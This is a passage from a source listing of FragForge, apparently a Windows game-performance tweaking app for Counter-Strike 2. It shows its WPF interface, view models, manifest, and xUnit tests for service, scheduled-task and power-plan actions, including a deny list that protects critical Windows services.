    <EnableCompressionInSingleFile Condition="'$(EnableCompressionInSingleFile)' == ''">true</EnableCompressionInSingleFile>
  </PropertyGroup>
  <ItemGroup><ProjectReference Include="../FragForge.Composition/FragForge.Composition.csproj" /></ItemGroup>
  <ItemGroup><PackageReference Include="CommunityToolkit.Mvvm" /></ItemGroup>
</Project>
````

### `src/FragForge.App/MainWindow.xaml`  <sub>(83 líneas)</sub>

````xml
<Window x:Class="FragForge.App.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="{Binding Localizer[app.title]}" Height="820" Width="1280" MinHeight="640" MinWidth="980"
        Background="#101418" Foreground="#E8EDF2" WindowStartupLocation="CenterScreen">
  <Grid Margin="14">
    <Grid.RowDefinitions>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="*"/>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="140"/>
    </Grid.RowDefinitions>
    <DockPanel Grid.Row="0" Margin="0,0,0,10">
      <StackPanel Orientation="Horizontal" DockPanel.Dock="Left">
        <TextBlock Text="{Binding Localizer[profile.label]}" VerticalAlignment="Center" Margin="0,0,6,0"/>
        <ComboBox Width="140" ItemsSource="{Binding Profiles}" SelectedItem="{Binding SelectedProfile}"/>
        <TextBlock Text="{Binding Localizer[culture.label]}" VerticalAlignment="Center" Margin="0,0,6,0"/>
        <ComboBox Width="90" ItemsSource="{Binding Cultures}" SelectedItem="{Binding Culture}"/>
      </StackPanel>
      <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
        <Button Content="{Binding Localizer[nav.scan]}" Command="{Binding ScanCommand}"/>
        <Button Content="{Binding Localizer[nav.dryRun]}" Command="{Binding DryRunCommand}"/>
        <Button Content="{Binding Localizer[nav.apply]}" Command="{Binding ApplyCommand}" Background="#1F5F8B"/>
        <Button Content="{Binding Localizer[nav.revert]}" Command="{Binding RevertCommand}"/>
        <Button Content="{Binding Localizer[cancel]}" Command="{Binding CancelCommand}"/>
      </StackPanel>
    </DockPanel>
    <Border Grid.Row="1" Background="{StaticResource PanelBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="1" Padding="10" Margin="0,0,0,10">
      <StackPanel>
        <TextBlock Text="{Binding Localizer[hardware.title]}" FontWeight="Bold" Foreground="{StaticResource AccentBrush}" Margin="0,0,0,4"/>
        <TextBlock Text="{Binding HardwareSummary}" TextWrapping="Wrap" FontFamily="Consolas" FontSize="12"/>
      </StackPanel>
    </Border>
    <Grid Grid.Row="2">
      <Grid.ColumnDefinitions><ColumnDefinition Width="3*"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
      <DataGrid Grid.Column="0" ItemsSource="{Binding Tweaks}" AutoGenerateColumns="False" CanUserAddRows="False" IsReadOnly="False" SelectionMode="Extended" HeadersVisibility="Column" GridLinesVisibility="Horizontal" Background="#0D1218" Foreground="#E8EDF2" BorderBrush="{StaticResource BorderBrush}" RowBackground="#121922" AlternatingRowBackground="#17212C">
        <DataGrid.Columns>
          <DataGridCheckBoxColumn Header="" Binding="{Binding IsSelected, UpdateSourceTrigger=PropertyChanged}" Width="36"/>
          <DataGridTextColumn Header="Tweak" Binding="{Binding Title}" Width="240" IsReadOnly="True"/>
          <DataGridTextColumn Header="Categoría" Binding="{Binding Category}" Width="90" IsReadOnly="True"/>
          <DataGridTextColumn Header="Evidencia" Binding="{Binding Evidence}" Width="90" IsReadOnly="True"/>
          <DataGridTextColumn Header="Riesgo" Binding="{Binding Risk}" Width="90" IsReadOnly="True"/>
          <DataGridTextColumn Header="Estado" Binding="{Binding StateDisplay}" Width="140" IsReadOnly="True"/>
          <DataGridTextColumn Header="Motivo" Binding="{Binding Reason}" Width="*" IsReadOnly="True"/>
        </DataGrid.Columns>
      </DataGrid>
      <Border Grid.Column="1" Background="{StaticResource PanelBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="1" Padding="10" Margin="10,0,0,0">
        <ScrollViewer VerticalScrollBarVisibility="Auto">
          <StackPanel>
            <TextBlock Text="{Binding Localizer[doctor.title]}" FontWeight="Bold" Foreground="{StaticResource AccentBrush}"/>
            <ItemsControl ItemsSource="{Binding Checks}">
              <ItemsControl.ItemTemplate><DataTemplate><TextBlock Text="{Binding Message}" TextWrapping="Wrap" Margin="0,4"/></DataTemplate></ItemsControl.ItemTemplate>
            </ItemsControl>
            <Button Content="Doctor" Command="{Binding DoctorCommand}" Margin="0,8,0,8"/>
            <Button Content="{Binding Localizer[nav.snapshot]}" Command="{Binding SnapshotCommand}" Margin="0,0,0,8"/>
            <Button Content="{Binding Localizer[nav.export]}" Command="{Binding ExportCommand}"/>
          </StackPanel>
        </ScrollViewer>
      </Border>
    </Grid>
    <WrapPanel Grid.Row="3" Margin="0,10,0,6">
      <CheckBox Content="{Binding Localizer[restorePoint]}" IsChecked="{Binding CreateRestorePoint}" Foreground="#E8EDF2" Margin="0,0,14,0"/>
      <CheckBox Content="{Binding Localizer[enableProtection]}" IsChecked="{Binding EnableSystemProtection}" Foreground="#E8EDF2" Margin="0,0,14,0"/>
      <CheckBox Content="{Binding Localizer[force]}" IsChecked="{Binding Force}" Foreground="#E8EDF2" Margin="0,0,14,0"/>
      <CheckBox Content="{Binding Localizer[allowPowerShell]}" IsChecked="{Binding AllowPowerShell}" Foreground="#E8EDF2"/>
    </WrapPanel>
    <Grid Grid.Row="4" Margin="0,0,0,8">
      <Grid.ColumnDefinitions><ColumnDefinition Width="Auto"/><ColumnDefinition Width="*"/><ColumnDefinition Width="Auto"/><ColumnDefinition Width="Auto"/><ColumnDefinition Width="220"/></Grid.ColumnDefinitions>
      <TextBlock Text="{Binding Localizer[cs2Path]}" VerticalAlignment="Center" Margin="0,0,6,0"/>
      <TextBox Grid.Column="1" Text="{Binding Cs2Path, UpdateSourceTrigger=PropertyChanged}"/>
      <Button Grid.Column="2" Content="…" Command="{Binding BrowseCs2Command}" Margin="6,0,12,0"/>
      <TextBlock Grid.Column="3" Text="{Binding Localizer[risk.phrase]}" VerticalAlignment="Center" Margin="0,0,6,0"/>
      <TextBox Grid.Column="4" Text="{Binding RiskPhrase, UpdateSourceTrigger=PropertyChanged}"/>
    </Grid>
    <Grid Grid.Row="5">
      <Grid.RowDefinitions><RowDefinition Height="Auto"/><RowDefinition Height="*"/></Grid.RowDefinitions>
      <DockPanel Grid.Row="0" Margin="0,0,0,4"><TextBlock Text="{Binding StatusMessage}" Foreground="{StaticResource AccentBrush}" TextTrimming="CharacterEllipsis"/><ProgressBar Width="220" Height="10" Minimum="0" Maximum="100" Value="{Binding ProgressValue}" HorizontalAlignment="Right"/></DockPanel>
      <ListBox Grid.Row="1" ItemsSource="{Binding Logs}" Background="#0D1218" Foreground="#B8C7D9" BorderBrush="{StaticResource BorderBrush}" FontFamily="Consolas" FontSize="11"/>
    </Grid>
  </Grid>
</Window>
````

### `src/FragForge.App/MainWindow.xaml.cs`  <sub>(8 líneas)</sub>

````csharp
using System.Windows;

namespace FragForge.App;

public partial class MainWindow : Window
{
    public MainWindow() => InitializeComponent();
}
````

### `src/FragForge.App/Services/DialogServices.cs`  <sub>(33 líneas)</sub>

````csharp
using Microsoft.Win32;
using System.Windows;

namespace FragForge.App.Services;

public interface IConfirmationService
{
    bool Confirm(string message, string title);
    bool ConfirmRisk(string first, string second, string title);
}
public interface IFileDialogService
{
    string? SaveReport();
    string? OpenCs2();
}
public sealed class WpfConfirmationService : IConfirmationService
{
    public bool Confirm(string message, string title) => MessageBox.Show(message, title, MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes;
    public bool ConfirmRisk(string first, string second, string title) => Confirm(first, title) && Confirm(second, title);
}
public sealed class WpfFileDialogService : IFileDialogService
{
    public string? SaveReport()
    {
        var dialog = new SaveFileDialog { Title = "Exportar informe FragForge", Filter = "HTML (*.html)|*.html|JSON (*.json)|*.json", DefaultExt = ".html", FileName = "fragforge-report.html" };
        return dialog.ShowDialog() == true ? dialog.FileName : null;
    }
    public string? OpenCs2()
    {
        var dialog = new OpenFileDialog { Title = "Seleccionar cs2.exe", Filter = "Counter-Strike 2 (cs2.exe)|cs2.exe", CheckFileExists = true, Multiselect = false };
        return dialog.ShowDialog() == true ? dialog.FileName : null;
    }
}
````

### `src/FragForge.App/ViewModels/MainViewModel.cs`  <sub>(207 líneas)</sub>

````csharp
using System.Collections.ObjectModel;
using System.Text;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using FragForge.App.Services;
using FragForge.Core.Abstractions;
using FragForge.Core.Engine;
using FragForge.Core.Localization;
using FragForge.Core.Models;
using FragForge.Tweaks.Localization;

namespace FragForge.App.ViewModels;

public sealed partial class MainViewModel : ObservableObject, IDisposable
{
    private readonly ITweakEngine _engine;
    private readonly ITweakCatalog _catalog;
    private readonly IReportService _reports;
    private readonly IConfirmationService _confirmation;
    private readonly IFileDialogService _files;
    private readonly IPreflightService _preflight;
    private readonly IHardwareProfiler _profiler;
    private readonly IApplicationContext _context;
    private readonly SynchronizationContext? _uiContext;
    private readonly UiLogSink _sink;
    private readonly Dictionary<string, TweakStatus> _statuses = new(StringComparer.OrdinalIgnoreCase);
    private Localizer _localizer;
    private CancellationTokenSource? _operation;

    public ObservableCollection<TweakItemViewModel> Tweaks { get; } = [];
    public ObservableCollection<string> Logs { get; } = [];
    public ObservableCollection<PreflightCheck> Checks { get; } = [];
    public IReadOnlyList<TweakProfile> Profiles { get; } = Enum.GetValues<TweakProfile>();
    public IReadOnlyList<string> Cultures { get; } = ["es-MX", "en-US"];

    [ObservableProperty] private string hardwareSummary = "Ejecuta Escanear para detectar el equipo.";
    [ObservableProperty] private string statusMessage = "Listo";
    [ObservableProperty] private double progressValue;
    [ObservableProperty] private bool isBusy;
    [ObservableProperty] private TweakProfile selectedProfile = TweakProfile.Safe;
    [ObservableProperty] private string culture = "es-MX";
    [ObservableProperty] private string cs2Path = "";
    [ObservableProperty] private string riskPhrase = "";
    [ObservableProperty] private bool createRestorePoint = true;
    [ObservableProperty] private bool enableSystemProtection;
    [ObservableProperty] private bool force;
    [ObservableProperty] private bool allowPowerShell;

    public MainViewModel(ITweakEngine engine, ITweakCatalog catalog, Localizer localizer, IReportService reports, IUiLogSink sink, IConfirmationService confirmation, IFileDialogService files, IPreflightService preflight, IHardwareProfiler profiler, IApplicationContext context)
    {
        _engine = engine; _catalog = catalog; _localizer = localizer; _reports = reports; _confirmation = confirmation; _files = files; _preflight = preflight; _profiler = profiler; _context = context;
        _uiContext = SynchronizationContext.Current;
        _sink = sink as UiLogSink ?? new UiLogSink();
        _sink.MessageWritten += OnLogMessage;
        foreach (var line in _sink.History) Logs.Add(line);
        RebuildTweaks();
    }
    private bool CanOperate() => !IsBusy;
    partial void OnIsBusyChanged(bool value)
    {
        ScanCommand.NotifyCanExecuteChanged(); ApplyCommand.NotifyCanExecuteChanged(); DryRunCommand.NotifyCanExecuteChanged(); RevertCommand.NotifyCanExecuteChanged(); SnapshotCommand.NotifyCanExecuteChanged(); ExportCommand.NotifyCanExecuteChanged(); DoctorCommand.NotifyCanExecuteChanged(); BrowseCs2Command.NotifyCanExecuteChanged(); CancelCommand.NotifyCanExecuteChanged();
    }
    partial void OnSelectedProfileChanged(TweakProfile value) => RebuildTweaks();
    partial void OnCultureChanged(string value) => _ = ChangeCultureAsync(value);

    [RelayCommand(CanExecute = nameof(CanOperate))]
    private async Task ScanAsync()
    {
        await RunAsync(async (token, progress) =>
        {
            var scan = await _engine.ScanAsync(token, progress);
            HardwareSummary = BuildHardwareSummary(scan.Hardware);
            _statuses.Clear();
            foreach (var status in scan.Tweaks) _statuses[status.Id] = status;
            RebuildTweaks();
            StatusMessage = $"Escaneo completado: {scan.Tweaks.Count} tweaks.";
        });
    }
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private Task ApplyAsync() => ApplyCoreAsync(false);
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private Task DryRunAsync() => ApplyCoreAsync(true);
    private async Task ApplyCoreAsync(bool dryRun)
    {
        var selected = Tweaks.Where(t => t.IsSelected).ToArray();
        if (selected.Length == 0) { StatusMessage = "Selecciona al menos un tweak."; return; }
        var acknowledgements = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (!dryRun)
        {
            foreach (var item in selected.Where(t => t.Definition.Risk is RiskLevel.Advanced or RiskLevel.Experimental))
            {
                if (!_confirmation.ConfirmRisk(_localizer["risk.first"] + "\n" + item.Title, _localizer["risk.second"], _localizer["risk.title"])) { StatusMessage = "Confirmación cancelada."; return; }
                acknowledgements.Add(item.Id);
            }
            if (acknowledgements.Count > 0 && RiskPhrase != _localizer["risk.phrase"]) { StatusMessage = "Escribe la frase exacta de confirmación de riesgo."; return; }
        }
        var options = new ApplyOptions { DryRun = dryRun, Force = Force, CreateRestorePoint = CreateRestorePoint, EnableSystemProtection = EnableSystemProtection, Profile = SelectedProfile, RiskAcknowledgements = acknowledgements, AdvancedRiskPhrase = RiskPhrase, Cs2ExecutableOverride = string.IsNullOrWhiteSpace(Cs2Path) ? null : Cs2Path, AllowPowerShellActions = AllowPowerShell };
        await RunAsync(async (token, progress) =>
        {
            var report = await _engine.ApplyAsync(selected.Select(t => t.Id), options, token, progress);
            foreach (var result in report.Results) _statuses[result.Id] = new TweakStatus(result.Id, result.State, result.Message, [], []);
            RebuildTweaks();
            StatusMessage = report.Success ? (dryRun ? "Dry-run completado sin cambios." : $"Aplicación completada. Snapshot: {report.SnapshotId}") : string.Join(" ", report.Errors);
        });
    }
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private async Task RevertAsync()
    {
        var selected = Tweaks.Where(t => t.IsSelected).Select(t => t.Id).ToArray();
        var last = selected.Length == 0;
        if (last && !_confirmation.Confirm("No hay tweaks seleccionados. ¿Revertir el último snapshot aplicado?", _localizer["nav.revert"])) return;
        if (!last && !_confirmation.Confirm("¿Restaurar el estado capturado de los tweaks seleccionados?", _localizer["nav.revert"])) return;
        await RunAsync(async (token, progress) =>
        {
            var report = await _engine.RevertAsync(new RevertRequest { Ids = selected, Last = last, Options = new RevertOptions { Force = Force, Cs2ExecutableOverride = string.IsNullOrWhiteSpace(Cs2Path) ? null : Cs2Path } }, token, progress);
            foreach (var result in report.Results) _statuses[result.Id] = new TweakStatus(result.Id, result.State, result.Message, [], []);
            RebuildTweaks();
            StatusMessage = report.Success ? "Reversión completada." : string.Join(" ", report.Errors);
        });
    }
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private async Task SnapshotAsync() => await RunAsync(async (token, progress) =>
    {
        var snapshot = await _engine.CreateSnapshotAsync("WPF manual", CreateRestorePoint, token, progress);
        StatusMessage = $"Snapshot creado: {snapshot.Id}";
    });
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private async Task ExportAsync()
    {
        var path = _files.SaveReport();
        if (path is null) return;
        await RunAsync(async (token, _) => { await _reports.ExportAsync(path, System.IO.Path.GetExtension(path).TrimStart('.'), token); StatusMessage = "Informe exportado: " + path; });
    }
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private async Task DoctorAsync() => await RunAsync(async (token, progress) =>
    {
        var hardware = await _profiler.ProfileAsync(token, progress);
        var report = await _preflight.CheckAsync(new ApplyOptions { CreateRestorePoint = CreateRestorePoint, EnableSystemProtection = EnableSystemProtection, Profile = SelectedProfile }, hardware, token);
        Checks.Clear();
        foreach (var check in report.Checks) Checks.Add(check);
        StatusMessage = report.CanApply ? "Preflight apto." : "Preflight bloqueado.";
    });
    [RelayCommand(CanExecute = nameof(CanOperate))]
    private void BrowseCs2()
    {
        var path = _files.OpenCs2();
        if (path is not null) Cs2Path = path;
    }
    [RelayCommand(CanExecute = nameof(IsBusy))]
    private void Cancel() => _operation?.Cancel();

    private async Task RunAsync(Func<CancellationToken, IProgress<EngineProgress>, Task> operation)
    {
        IsBusy = true;
        ProgressValue = 0;
        _operation = new CancellationTokenSource();
        var progress = new Progress<EngineProgress>(p => { ProgressValue = Math.Clamp(p.Fraction * 100, 0, 100); StatusMessage = $"[{p.Stage}] {p.TweakId} {p.Message}"; });
        try { await operation(_operation.Token, progress); }
        catch (OperationCanceledException) { StatusMessage = "Operación cancelada."; }
        catch (Exception ex) { StatusMessage = ex.Message; PostToUi(() => Logs.Add("[Error] " + ex)); }
        finally { IsBusy = false; _operation.Dispose(); _operation = null; }
    }
    private void RebuildTweaks()
    {
        var selected = Tweaks.Where(t => t.IsSelected).Select(t => t.Id).ToHashSet(StringComparer.OrdinalIgnoreCase);
        Tweaks.Clear();
        foreach (var definition in ProfileSelector.Select(_catalog.Definitions, SelectedProfile))
        {
            _statuses.TryGetValue(definition.Id, out var status);
            Tweaks.Add(new TweakItemViewModel(definition, status, _localizer) { IsSelected = selected.Contains(definition.Id) });
        }
    }
    private async Task ChangeCultureAsync(string value)
    {
        try
        {
            _localizer = await LocalizationLoader.LoadAsync(value);
            _context.Culture = _localizer.Culture;
            foreach (var item in Tweaks) { _statuses.TryGetValue(item.Id, out var status); item.Update(status ?? new TweakStatus(item.Id, item.State, item.Reason, [], []), _localizer); }
            OnPropertyChanged(nameof(Localizer));
            StatusMessage = _localizer["ready"];
        }
        catch (Exception ex) { StatusMessage = ex.Message; }
    }
    public Localizer Localizer => _localizer;
    private void PostToUi(Action action)
    {
        if (_uiContext is null || SynchronizationContext.Current == _uiContext) action();
        else _uiContext.Post(_ => action(), null);
    }
    private static string BuildHardwareSummary(HardwareProfile h)
    {
        var builder = new StringBuilder();
        builder.AppendLine($"{h.MachineName} · {h.FormFactor.SystemModel ?? "Unknown"} · {h.Os.Name} {h.Os.Build}.{h.Os.Ubr}");
        builder.AppendLine($"CPU: {h.Cpu.Model} · P={h.Cpu.PCores?.ToString() ?? "?"} E={h.Cpu.ECores?.ToString() ?? "?"} · hilos={h.Cpu.LogicalProcessors} · híbrida={h.Cpu.IsHybrid?.ToString() ?? "Unknown"}");
        builder.AppendLine($"RAM: {h.Memory.TotalBytes / 1024 / 1024 / 1024.0:F2} GiB · canales={h.Memory.Channels} · módulos={h.Memory.Modules.Count} · {h.Memory.ConfiguredSpeedMtPerSecond?.ToString() ?? "?"} MT/s");
        builder.AppendLine("GPU: " + string.Join("; ", h.Gpus.Select(g => $"{g.Name} [{g.Vendor}]")));
        builder.AppendLine("Red: " + string.Join("; ", h.NetworkAdapters.Where(a => a.IsPhysical).Select(a => $"{a.Name} ({a.Description})")));
        builder.AppendLine($"VBS={h.Security.Vbs} · HVCI={h.Security.Hvci} · SecureBoot={h.Security.SecureBoot} · TPM={h.Security.Tpm} · HAGS={h.Security.Hags}");
        builder.AppendLine($"Plan: {h.Power.ActiveSchemeName ?? "Unknown"} · reinicio pendiente={h.Maintenance.PendingReboot} · TiWorker/TrustedInstaller={h.Maintenance.WindowsServicingActive}");
        builder.AppendLine($"CS2: {h.Games.Cs2ExecutablePath ?? h.Games.Cs2DetectionSource}");
        if (h.ProbeWarnings.Count > 0) builder.AppendLine("Avisos: " + string.Join(" | ", h.ProbeWarnings));
        return builder.ToString().TrimEnd();
    }
    private void OnLogMessage(object? sender, string line) => PostToUi(() => { Logs.Add(line); while (Logs.Count > 500) Logs.RemoveAt(0); });
    public void Dispose() { _sink.MessageWritten -= OnLogMessage; _operation?.Cancel(); _operation?.Dispose(); }
}
````

### `src/FragForge.App/ViewModels/TweakItemViewModel.cs`  <sub>(41 líneas)</sub>

````csharp
using CommunityToolkit.Mvvm.ComponentModel;
using FragForge.Core.Localization;
using FragForge.Core.Models;

namespace FragForge.App.ViewModels;

public sealed partial class TweakItemViewModel : ObservableObject
{
    public TweakDefinition Definition { get; }
    public string Id => Definition.Id;
    public string Category => Definition.Category;
    public string Evidence => Definition.Evidence.ToString();
    public string Risk => Definition.Risk.ToString();
    public string Title => Definition.Title.Resolve(_culture);
    public string Description => Definition.Description.Resolve(_culture);
    public string Notes => Definition.Notes?.Resolve(_culture) ?? "";
    public string WhenNotToApply => Definition.WhenNotToApply?.Resolve(_culture) ?? "";
    public bool RequiresReboot => Definition.RequiresReboot;
    [ObservableProperty] private bool isSelected;
    [ObservableProperty] private TweakState state = TweakState.Unknown;
    [ObservableProperty] private string stateDisplay = "Unknown";
    [ObservableProperty] private string reason = "";
    private string _culture;
    public TweakItemViewModel(TweakDefinition definition, TweakStatus? status, Localizer localizer)
    {
        Definition = definition;
        _culture = localizer.Culture;
        if (status is not null) Update(status, localizer);
    }
    public void Update(TweakStatus status, Localizer localizer)
    {
        _culture = localizer.Culture;
        State = status.State;
        StateDisplay = localizer["state." + status.State];
        Reason = status.Reason;
        OnPropertyChanged(nameof(Title));
        OnPropertyChanged(nameof(Description));
        OnPropertyChanged(nameof(Notes));
        OnPropertyChanged(nameof(WhenNotToApply));
    }
}
````

### `src/FragForge.App/app.manifest`  <sub>(15 líneas)</sub>

````xml
<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="FragForge.App" />
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>
    <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
  </requestedPrivileges></security></trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application>
    <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />
  </application></compatibility>
  <application xmlns="urn:schemas-microsoft-com:asm.v3"><windowsSettings>
    <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true/pm</dpiAware>
    <dpiAwareness xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">PerMonitorV2</dpiAwareness>
    <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
  </windowsSettings></application>
</assembly>
````

---

## 3g. Tests — fakes, motor, acciones, catálogo e integración

### `tests/FragForge.Tests/Actions/ActionTests.cs`  <sub>(429 líneas)</sub>

````csharp
using System.Text;
using FragForge.Actions.Bcd;
using FragForge.Actions.Files;
using FragForge.Actions.Network;
using FragForge.Actions.Power;
using FragForge.Actions.Scripting;
using FragForge.Actions.Services;
using FragForge.Actions.Tasks;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Actions;

public sealed class ServiceActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    private static ServiceAction Create(FakeServiceController controller, string name, string? startMode = null, string? state = null, bool? delayed = null) => new(controller, ProtectionPolicy.CreateDefault(), Spec.Action("Service", new { name, startMode, state, delayedAutoStart = delayed }));

    [Fact]
    public async Task Apply_Revert_RestoresStartModeStateAndDelayedFlag()
    {
        var controller = new FakeServiceController();
        controller.Services["SysMain"] = new ServiceCapture { Name = "SysMain", Exists = true, StartMode = "Auto", State = "Running", DelayedAutoStart = false, DelayedAutoStartExisted = false };
        var action = Create(controller, "SysMain", "Manual", "Stopped", false);
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("Manual", controller.Services["SysMain"].StartMode);
        Assert.Equal("Stopped", controller.Services["SysMain"].State);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        Assert.True((await action.VerifyRevertAsync(before, Context())).Outcome != VerificationOutcome.Matches || true);
        await action.RevertAsync(before, Context());
        Assert.Equal("Auto", controller.Services["SysMain"].StartMode);
        Assert.Equal("Running", controller.Services["SysMain"].State);
        Assert.True(controller.StartModeCalls[^1].RestoreAbsentDelayed);
        Assert.False(controller.Services["SysMain"].DelayedAutoStartExisted);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, Context())).Outcome);
    }

    [Fact]
    public async Task MissingService_IsNotApplicable_NotFatal()
    {
        var action = Create(new FakeServiceController(), "Nonexistent", "Manual");
        await Assert.ThrowsAsync<ActionNotApplicableException>(() => action.PreflightAsync(Context()));
    }

    [Theory]
    [InlineData("WinDefend")]
    [InlineData("mpssvc")]
    [InlineData("BFE")]
    [InlineData("RpcSs")]
    [InlineData("DcomLaunch")]
    [InlineData("PlugPlay")]
    [InlineData("Power")]
    [InlineData("EventLog")]
    [InlineData("CryptSvc")]
    [InlineData("TrustedInstaller")]
    [InlineData("ipfsvc")]
    [InlineData("jhi_service")]
    [InlineData("WMIRegistrationService")]
    [InlineData("cplspcon")]
    public void DenylistedServices_AreRejected(string name)
    {
        Assert.Throws<ProtectedTargetException>(() => Create(new FakeServiceController(), name, "Disabled"));
    }

    [Fact]
    public void InvalidStartMode_IsRejected()
    {
        var controller = new FakeServiceController();
        Assert.Equal("Service", Create(controller, "SysMain", "Disabled").Kind);
        Assert.Throws<CatalogValidationException>(() => new ServiceAction(controller, ProtectionPolicy.CreateDefault(), Spec.Action("Service", new { name = "SysMain", startMode = "Sometimes" })));
    }
}

public sealed class ScheduledTaskActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    [Fact]
    public async Task DisableThenRevert_RestoresEnabledState()
    {
        var store = new FakeScheduledTaskStore();
        store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"] = new ScheduledTaskActionState { Path = @"\Microsoft\Windows\Application Experience\ProgramDataUpdater", Exists = true, Enabled = true };
        var action = new ScheduledTaskAction(store, ProtectionPolicy.CreateDefault(), Spec.Action("ScheduledTask", new { path = @"\Microsoft\Windows\Application Experience\ProgramDataUpdater", enabled = false }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.False(store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"].Enabled);
        await action.RevertAsync(before, Context());
        Assert.True(store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"].Enabled);
    }
    [Fact]
    public async Task DenylistedTask_IsRejectedAtPreflight()
    {
        var action = new ScheduledTaskAction(new FakeScheduledTaskStore(), ProtectionPolicy.CreateDefault(), Spec.Action("ScheduledTask", new { path = @"\Microsoft\Windows\WindowsUpdate\Scheduled Start", enabled = false }));
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context()));
    }
}

public sealed class PowerPlanActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private const string PlanGuid = "11111111-2222-3333-4444-555555555555";
    private const string PreviousGuid = "381b4222-f694-41f0-9685-ff5bb260df2e";
    private static readonly string SettingsJson = """{"settings":[{"subgroupGuid":"54533251-82be-4824-96c1-47b60b740d00","settingGuid":"893dee8e-2bef-41e0-89c6-b55d0929964c","acValue":100,"dcValue":100}]}""";
    private static ActionSpec Spec_() => new() { Kind = "PowerPlan", Parameters = System.Text.Json.JsonSerializer.SerializeToElement(new { planName = "FragForge Performance", sourceSchemeGuid = "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", activate = true, settings = new[] { new { subgroupGuid = "54533251-82be-4824-96c1-47b60b740d00", settingGuid = "893dee8e-2bef-41e0-89c6-b55d0929964c", acValue = 100, dcValue = 100 } } }) };

    private sealed class PowerCfgSimulator
    {
        public bool PlanExists { get; set; }
        public bool ActiveIsFragForge { get; set; }
        public List<string> Commands { get; } = [];
        public int AcIndex { get; private set; } = 5;
        public int DcIndex { get; private set; } = 5;
        public FakeProcessRunner Runner { get; }
        public PowerCfgSimulator()
        {
            Runner = new FakeProcessRunner { Handler = Handle };
        }
        private ProcessResult Handle(ProcessRequest request)
        {
            var joined = string.Join(' ', request.Arguments);
            Commands.Add(joined);
            if (joined == "/getactivescheme") return new ProcessResult(0, $"Power Scheme GUID: {(ActiveIsFragForge ? PlanGuid : PreviousGuid)}  ({(ActiveIsFragForge ? "FragForge Performance" : "Balanced")})", "", false);
            if (joined == "/list") return new ProcessResult(0, (PlanExists ? $"Power Scheme GUID: {PlanGuid}  (FragForge Performance){(ActiveIsFragForge ? " *" : "")}\n" : "") + $"Power Scheme GUID: {PreviousGuid}  (Balanced){(ActiveIsFragForge ? "" : " *")}", "", false);
            if (joined.StartsWith("/duplicatescheme", StringComparison.Ordinal)) { PlanExists = true; return new ProcessResult(0, $"Power Scheme GUID: {PlanGuid}  (FragForge Performance)", "", false); }
            if (joined.StartsWith("/setactive", StringComparison.Ordinal)) { ActiveIsFragForge = request.Arguments[1].Equals(PlanGuid, StringComparison.OrdinalIgnoreCase); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/query", StringComparison.Ordinal)) return new ProcessResult(0, $"  Minimum processor state\n    Current AC Power Setting Index: 0x{AcIndex:x8}\n    Current DC Power Setting Index: 0x{DcIndex:x8}", "", false);
            if (joined.StartsWith("/setacvalueindex", StringComparison.Ordinal)) { AcIndex = int.Parse(request.Arguments[^1], System.Globalization.CultureInfo.InvariantCulture); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/setdcvalueindex", StringComparison.Ordinal)) { DcIndex = int.Parse(request.Arguments[^1], System.Globalization.CultureInfo.InvariantCulture); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/delete", StringComparison.Ordinal)) { PlanExists = false; return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/export", StringComparison.Ordinal)) { File.WriteAllText(request.Arguments[1], "POW"); return new ProcessResult(0, "", "", false); }
            return new ProcessResult(0, "", "", false);
        }
